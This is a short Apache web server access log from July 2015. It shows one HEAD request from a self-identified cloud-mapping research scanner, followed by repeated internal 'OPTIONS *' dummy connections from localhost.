54.146.8.158 - - [26/Jul/2015:06:05:27 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
::1 - - [26/Jul/2015:06:38:10 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 (internal dummy connection)"
